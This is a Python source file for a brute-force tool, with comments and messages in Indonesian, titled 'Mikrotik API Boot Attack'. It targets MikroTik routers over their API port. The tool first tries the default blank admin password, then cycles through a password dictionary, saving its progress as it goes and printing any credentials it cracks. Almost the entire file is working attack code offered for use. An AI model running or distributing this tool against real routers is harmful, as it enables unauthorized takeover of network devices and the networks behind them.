#!/usr/bin/env python
#Python3
import sys
if sys.version_info < (3, 0):
    sys.stdout.write("Maaf, Python 3.x diperlukan untuk menjalankan alat ini\n")
    sys.exit(2)

import json, os
import binascii, getopt, hashlib, select, socket, time, signal, codecs, ssl
from MikrotikLog import Log
from colorama import Fore, Style, init
init()

# Konstanta - Definisikan nilai default
USE_SSL = False
TARGET = None
PORT = None
SSL_PORT = 8729
USER = None
PASSWORD = None
VERBOSE = False  # Apakah akan mencetak percakapan API dengan router. Berguna untuk debugging
VERBOSE_LOGIC = 'OR'  # Apakah akan mencetak dan menyimpan log yang detail ke file. AND - cetak dan simpan, OR - lakukan salah satu saja.
VERBOSE_FILE_MODE = 'w'  # Apakah akan membuat file baru ('w') untuk log atau menambahkan ke file lama ('a').

CONTEXT = ssl.create_default_context()  # Dimungkinkan untuk mendefinisikan konteks terlebih dahulu untuk socket SSL
CONTEXT.check_hostname = False
CONTEXT.verify_mode = ssl.CERT_NONE

class LoginError(Exception):
    pass

class WordTooLong(Exception):
    pass

class CreateSocketError(Exception):
    pass

class RouterOSTrapError(Exception):
    pass


banner_part = r'''
    __  __ _ _              _   _ _    ____        _   
   |  \/  (_) |            | | (_) |  |  _ \      | |  
   | \  / |_| | ___ __ ___ | |_ _| | _| |_) | ___ | |_ 
   | |\/| | | |/ / '__/ _ \| __| | |/ /  _ < / _ \| __|
   | |  | | |   <| | | (_) | |_| |   <| |_) | (_) | |_ 
   |_|  |_|_|_|\_\_|  \___/ \__|_|_|\_\____/ \___/ \__|                                                    
                                                                                                                                                                             
            Mikrotik API Boot Attack 1.0.0.1
            https://github.com/MichaelJorky
'''

banner = f"{Fore.CYAN}{banner_part}{Style.RESET_ALL}"

def usage():
    print(f"{Fore.YELLOW}NAME{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t MikrotikBot.py - Alat serangan brute force pada kredensial Mikrotik yang mengeksploitasi permintaan API{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}USAGE{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t python MikrotikBot.py [-t] [-p] [-u] [-d] [-s] [-q] [-a]{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}OPTIONS{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t -t, --target \t\t Target Mikrotik{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t -p, --port \t\t Mikrotik port (default 8728){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t -u, --user \t\t Nama pengguna (default admin){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t -h, --help \t\t Bantuan{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t -d, --dictionary \t Kamus kata sandi{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t -s, --seconds \t\t Jeda detik antara upaya percobaan ulang (default 1){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t -q, --quiet \t\t Mode senyap{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t -a, --autosave \t\t Secara otomatis menyimpan kemajuan saat ini ke file, dan membacanya saat startup{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}EXAMPLE{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t python MikrotikBot.py -t 10.10.10.1 -d password.txt{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t python MikrotikBot.py -t 10.10.10.1 -d password.txt -a autosave.json{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}\t python MikrotikBot.py -t 10.10.10.1 -u admin -p 80 -d password.txt -s 3{Style.RESET_ALL}")


def error(err):
    print(f"{Fore.RED}{err}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Coba 'MikrotikBot.py -h' atau 'MikrotikBot.py --help' untuk informasi lebih lanjut.{Style.RESET_ALL}")


def signal_handler(signal, frame):
    print(f"{Fore.CYAN}Dibatalkan oleh pengguna. Keluar...{Style.RESET_ALL}")
    sys.exit(2)


class ApiRos:
    '''Kelas yang dimodifikasi dari API resmi Mikrotik'''
    def __init__(self, sk, target, user, password, use_ssl=USE_SSL, port=8728,
                 verbose=VERBOSE, context=CONTEXT):

        self.target = target
        self.user = user
        self.password = password
        self.use_ssl = use_ssl
        self.port = port
        self.verbose = verbose
        self.context = context
        self.status = None
        
        self.sk = sk
        self.currenttag = 0

        # Port setting logic
        if port:
            self.port = port
        elif use_ssl:
            self.port = SSL_PORT
        else:
            self.port = PORT

         # Buat instance Log untuk menyimpan atau mencetak log yang detail
        sys.log = Log(verbose, VERBOSE_LOGIC, VERBOSE_FILE_MODE)
        sys.log('')
        sys.log('#--------Mikrotik API Brute force Attack#--------')
        sys.log('#-----------------------------------------------#')
        sys.log('API IP - {}, USER - {}'.format(target, user))
        self.sock = None
        self.connection = None
        self.create_connection()
        sys.log('Contoh Api dibuat')

    # Buka koneksi socket dengan router dan bungkus dengan SSL jika diperlukan.
    def open_socket(self):
        for res in socket.getaddrinfo(self.target, self.port, socket.AF_UNSPEC, socket.SOCK_STREAM):
            af, socktype, proto, canonname, sa = res

        self.sock = socket.socket(af, socket.SOCK_STREAM)
        self.sock.settimeout(5)  # Atur batas waktu socket menjadi 5 detik, default adalah None

        connected = False
        while not connected:
            try:
                # Mencoba menghubungi Mikrotik, kesalahan dapat terjadi jika IP target tidak dapat dijangkau, atau API diblokir
                # Firewall Mikrotik, layanan IP, atau port salah.
                self.connection = self.sock.connect(sa)
                connected = True

            except (socket.timeout):
                print(f"{Fore.RED}[-] WAKTU SOCKET HABIS!{Style.RESET_ALL} {Fore.YELLOW}Target waktunya habis!{Style.RESET_ALL}")
                time.sleep(60)

            except OSError:
                print(f"{Fore.RED}[-] KESALAHAN SOKET!{Style.RESET_ALL} {Fore.YELLOW}Periksa Target (parameter IP atau PORT). Keluar...{Style.RESET_ALL}")
                raise CreateSocketError(f"{Fore.RED}Kesalahan: API gagal terhubung ke soket.. Host: {self.target}, port: {self.port}.{Style.RESET_ALL}")

        # if self.use_ssl:
        #     try:
        #         self.sock = self.context.wrap_socket(self.sock)
        #     except:
        #        print(f"{Fore.RED}[-] KESALAHAN SOKET!{Style.RESET_ALL} {Fore.YELLOW}Operasi handshake melebihi batas waktu. Keluar...{Style.RESET_ALL}")
        #        pass

        sys.log('Koneksi soket API terbuka.')

    def login(self, username, pwd):
        sentence = ['/login', '=name=' + username, '=password=' + pwd]
        reply = self.communicate(sentence)
        if len(reply[0]) == 1 and reply[0][0] == '!done':
            # Jika proses login berhasil
            sys.log('Berhasil masuk!')
            return reply
        elif 'Error' in reply:
            # Jika tidak, jika terjadi kesalahan selama proses login
            sys.log('Kesalahan dalam proses login - {}'.format(reply))
            raise LoginError('Login ' + reply)
        elif len(reply[0]) == 2 and reply[0][1][0:5] == '=ret=':
            # Jika tidak, jika mikrotik menggunakan metode login API lama, kode akan melanjutkan dengan metode lama
            sys.log('Menggunakan proses login lama.')
            md5 = hashlib.md5(('\x00' + pwd).encode('utf-8'))
            md5.update(binascii.unhexlify(reply[0][1][5:]))
            sentence = ['/login', '=name=' + username, '=response=00'
                        + binascii.hexlify(md5.digest()).decode('utf-8')]
            sys.log('Berhasil masuk!')
            return self.communicate(sentence)
    
    # Mengirim data ke router dan mengharapkan respons
    def communicate(self, sentence_to_send):

        # Ada cara khusus untuk mengirim panjang kata dalam API Mikrotik.
        # Lihat Wiki API Mikrotik untuk informasi lebih lanjut.
        def send_length(sentence_to_send):
            length_to_send = len(sentence_to_send)
            if length_to_send < 0x80:
                num_of_bytes = 1  # Untuk kata-kata yang lebih kecil dari 128
            elif length_to_send < 0x4000:
                length_to_send += 0x8000
                num_of_bytes = 2  # Untuk kata-kata yang lebih kecil dari 16384
            elif length_to_send < 0x200000:
                length_to_send += 0xC00000
                num_of_bytes = 3  # Untuk kata-kata yang lebih kecil dari 2097152
            elif length_to_send < 0x10000000:
                length_to_send += 0xE0000000
                num_of_bytes = 4  # Untuk kata-kata yang lebih kecil dari 268435456
            elif length_to_send < 0x100000000:
                num_of_bytes = 4  # Untuk kata-kata yang lebih kecil dari 4294967296
                self.sock.sendall(b'\xF0')
            else:
                raise WordTooLong('Kata-katanya terlalu panjang. Panjang maksimal kata adalah 4294967295.')
            self.sock.sendall(length_to_send.to_bytes(num_of_bytes, byteorder='big'))

            # Sebenarnya saya belum berhasil mengirim kata-kata yang lebih besar dari sekitar 65520 karakter.
            # Mungkin ini adalah batasan mikrotik sebesar 2^16.

        # Logika yang sama berlaku untuk menerima panjang kata dari sisi mikrotik.
        # Lihat Wiki API Mikrotik untuk informasi lebih lanjut.
        def receive_length():
            r = self.sock.recv(1)  # Terima byte pertama dari panjang kata

            # Jika byte pertama dari kata lebih kecil dari 80 (basis 16),
            # maka kita sudah menerima seluruh panjangnya dan bisa mengembalikannya.
            # Sebaliknya, jika lebih besar, maka ukuran kata dikodekan dalam beberapa byte dan kita harus menerima semuanya untuk
            # mendapatkan ukuran kata yang lengkap.

            if r < b'\x80':
                r = int.from_bytes(r, byteorder='big')
            elif r < b'\xc0':
                r += self.sock.recv(1)
                r = int.from_bytes(r, byteorder='big')
                r -= 0x8000
            elif r < b'\xe0':
                r += self.sock.recv(2)
                r = int.from_bytes(r, byteorder='big')
                r -= 0xC00000
            elif r < b'\xf0':
                r += self.sock.recv(3)
                r = int.from_bytes(r, byteorder='big')
                r -= 0xE0000000
            elif r == b'\xf0':
                r = self.sock.recv(4)
                r = int.from_bytes(r, byteorder='big')
            return r

        def read_sentence():
            rcv_sentence = []  # Kata-kata akan ditambahkan di sini
            rcv_length = receive_length()  # Dapatkan ukuran kata

            while rcv_length != 0:
                received = b''
                while rcv_length > len(received):
                    rec = self.sock.recv(rcv_length - len(received))
                    if rec == b'':
                        raise RuntimeError('sambungan soket rusak')
                    received += rec
                received = received.decode('utf-8', 'backslashreplace')
                sys.log('<<< {}'.format(received))
                rcv_sentence.append(received)
                rcv_length = receive_length()  # Dapatkan ukuran kata berikutnya
            return rcv_sentence

        # Mengirim bagian dari percakapan
        # Setiap kata harus dikirim secara terpisah.
        # Pertama, panjang kata harus dikirim,
        # Kemudian, kata itu sendiri.

        for word in sentence_to_send:
            send_length(word)
            self.sock.sendall(word.encode('utf-8'))  # Mengirim kata
            sys.log('>>> {}'.format(word))
        self.sock.sendall(b'\x00')  # Kirim kata dengan panjang nol untuk menandai akhir kalimat

        # Menerima bagian dari percakapan
        # Akan terus menerima sampai menerima '!done' atau semacam kesalahan (!trap).
        # Semua akan ditambahkan ke variabel paragraf, dan kemudian dikembalikan.
        paragraph = []
        received_sentence = ['']
        while received_sentence and received_sentence[0] != '!done':
            received_sentence = read_sentence()
            paragraph.append(received_sentence)
        self.status = paragraph
        self.close()
        return paragraph
        

    # Inisialisasi percakapan dengan router
    def talk(self, message):

        # Pesan bisa berupa string, tuple, atau list yang berisi beberapa string atau tuple
        if type(message) == str or type(message) == tuple:
            return self.send(message)
        elif type(message) == list:
            reply = []
            for sentence in message:
                reply.append(self.send(sentence))
            return reply
        else:
            raise TypeError('talk() argumen harus berupa str atau tuples yang berisi str atau daftar yang berisi str atau tuples')

    def send(self, sentence):
        # Jika kalimat berupa string, bukan tuple dari string, maka harus dibagi menjadi kata-kata
        if type(sentence) == str:
            sentence = sentence.split()
        reply = self.communicate(sentence)

        # Jika Mikrotik mengembalikan kesalahan dari perintah yang dikirim
        if '!trap' in reply[0][0]:
            # Anda bisa memberi komentar pada baris berikut jika tidak ingin menimbulkan kesalahan dalam kasus !trap
            raise RouterOSTrapError("\nCommand: {}\nReturned an error: {}".format(sentence, reply))
            pass

        # Balasan adalah list yang berisi string dengan output RAW dari API
        # nice_reply adalah list yang berisi output dari API yang diurutkan dalam dictionary untuk kemudahan penggunaan selanjutnya
        nice_reply = []
        for m in range(len(reply) - 1):
            nice_reply.append({})
            for k, v in (x[1:].split('=', 1) for x in reply[m][1:]):
                nice_reply[m][k] = v
        return nice_reply

    def is_alive(self) -> bool:
        """Periksa apakah socket masih aktif dan router merespons"""

        # Periksa apakah socket terbuka di sisi ini
        try:
            self.sock.settimeout(2)
        except OSError:
            sys.log("Socket is closed.")
            return False

        # Periksa apakah kita bisa mengirim dan menerima melalui socket
        try:
            self.talk('/system/identity/print')

        except (socket.timeout, IndexError, BrokenPipeError):
            sys.log("Router tidak merespons, menutup soket.")
            self.close()
            return False

        sys.log("Soket terbuka, router merespons.")
        self.sock.settimeout(None)
        return True

    def create_connection(self):
        """Buat koneksi API

        1. Buka socket
        2. Masuk ke router
        """
        self.open_socket()
        self.login(self.user, self.password)

    def close(self):
        sys.log("Koneksi soket API ditutup.")
        self.sock.close()

def run(pwd_num):
    run_time = "%.1f" % (time.time() - t)
    status = f"{Fore.GREEN}Total Waktu Pengujian: {run_time} detik | Kata Sandi Dicoba: {pwd_num}{Style.RESET_ALL}"
    bar = "_" * len(status)
    print(f"{Fore.BLUE}{bar}{Style.RESET_ALL}")
    print(status + "\n")

def main():
    print(banner)
    try:
        opts, args = getopt.getopt(sys.argv[1:], "ht:p:u:d:s:a:q", ["help", "target=", "port=", "user=", "dictionary=", "seconds=", "autosave=", "quiet"])
    except getopt.GetoptError as err:
        error(err)
        sys.exit(2)

    if not opts:
        error("KESALAHAN: Anda harus menentukan setidaknya Target dan Kamus")
        sys.exit(2)

    target = None
    port = None
    user = None
    dictionary = None
    quietmode = False
    seconds = None
    autosave_file = None

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            usage()
            sys.exit(0)
        elif opt in ("-t", "--target"):
            target = arg
        elif opt in ("-p", "--port"):
            port = arg
        elif opt in ("-u", "--user"):
            user = arg
        elif opt in ("-d", "--dictionary"):
            dictionary = arg
        elif opt in ("-s", "--seconds"):
            seconds = arg
        elif opt in ("-q", "--quiet"):
            quietmode = True
        elif opt in ("-a", "--autosave"):
            autosave_file = arg
        else:
            assert False, "error"
            sys.exit(2)

    if not target:
        error("KESALAHAN: Anda harus menentukan Target")
        sys.exit(2)
    if not dictionary:
        error("KESALAHAN: Anda harus menentukan Kamus")
        sys.exit(2)
    if not port:
        port = 8728
    if not user:
        user = 'admin'
    if not seconds:
        seconds = 1

    print(f"{Fore.YELLOW}[*] Memulai serangan Bruteforce...{Style.RESET_ALL}")
    print("-" * 33)

    # Tangkap KeyboardInterrupt
    signal.signal(signal.SIGINT, signal_handler)
    
    # Mencari kredensial default Mikrotik
    defcredcheck = True

    # Dapatkan jumlah baris dalam file
    count = 0
    dictFile = codecs.open(dictionary,'rb', encoding='utf-8', errors='ignore')
    while 1:
        buffer = dictFile.read(8192*1024)
        if not buffer: break
        count += buffer.count('\n')
    dictFile.seek(0)

    last_password = None
    if autosave_file and os.path.isfile(autosave_file):
      print(f"{Fore.BLUE}[*] Memuat data penyimpanan otomatis dari file {Fore.MAGENTA}{autosave_file}{Style.RESET_ALL}")
      with open(autosave_file) as autosave_json:
        autosave_data = json.load(autosave_json)
        last_password = autosave_data["last_password"]
    
    # Iterasi kata sandi & pembuatan socket
    items = 1
    for password in dictFile.readlines():
        password = password.strip('\r\n')

        # Kembali ke kata sandi yang disimpan otomatis jika sudah didefinisikan
        if last_password:
            if password != last_password:
                items += 1
                continue
            else:
                last_password = None

        # Pertama-tama, kita akan mencoba dengan kredensial default Mikrotik ("admin":"")
        while defcredcheck:
            s = None
            apiros = ApiRos(s, target, "admin", "", port)
            dictFile.close()
            defaultcreds = apiros.status
            login = ''.join(defaultcreds[0][0])

            print(f"{Fore.RED}[-] Mencoba dengan kredensial default di Mikrotik...{Style.RESET_ALL}")
            if login == "!done":
                print(f"{Fore.GREEN}[+] Masuk berhasil!!!{Style.RESET_ALL} {Fore.YELLOW}Kredensial Mikrotik default tidak diubah.{Style.RESET_ALL} {Fore.RED}Masuk dengan admin:<BLANK>{Style.RESET_ALL}")
                sys.exit(0)
            else:
                print(f"{Fore.RED}[-] Kredensial Mikrotik default tidak berhasil,{Style.RESET_ALL} {Fore.YELLOW}coba gunakan {Fore.CYAN}{count}{Style.RESET_ALL} {Fore.YELLOW}kata sandi dalam daftar...{Style.RESET_ALL}")
                print("")
                defcredcheck = False
                time.sleep(1)

        apiros = ApiRos(s, target, user, password, port)
        loginoutput = apiros.status
        login = ''.join(loginoutput[0][0])

        if not quietmode:
            print(f"{Fore.RED}[-] Mencoba {Fore.GREEN}{items}{Style.RESET_ALL} {Fore.RED}Dari {Fore.GREEN}{count}{Style.RESET_ALL} {Fore.RED}Kata Sandi - Saat Ini: {Fore.CYAN}{password}{Style.RESET_ALL}")
            apiros.close()

        if login == "!done":
            print(f"{Fore.GREEN}[+] Berhasil masuk!!!{Style.RESET_ALL} Pengguna: {Fore.CYAN}{user}{Style.RESET_ALL} Kata sandi: {Fore.YELLOW}{password}{Style.RESET_ALL}")
            run(items)
            return
        items +=1

        if autosave_file and items % 20 == 0:
            print(f"{Fore.BLUE}[*] Menyimpan data kemajuan secara otomatis ke file {Fore.MAGENTA}{autosave_file}{Style.RESET_ALL}")
            with open(autosave_file, "w") as autosave_json:
                autosave_data = {
                    "last_password": password
                }
                json.dump(autosave_data, autosave_json)

        time.sleep(int(seconds))
    
    print()
    print(f"{Fore.RED}[*] SERANGAN SELESAI!{Style.RESET_ALL} {Fore.YELLOW}Tidak ada kredensial yang cocok ditemukan.{Style.RESET_ALL} {Fore.CYAN}Coba lagi dengan daftar kata yang berbeda.{Style.RESET_ALL}")
    run(count)

if __name__ == '__main__':
    t = time.time()
    main()
    sys.exit()


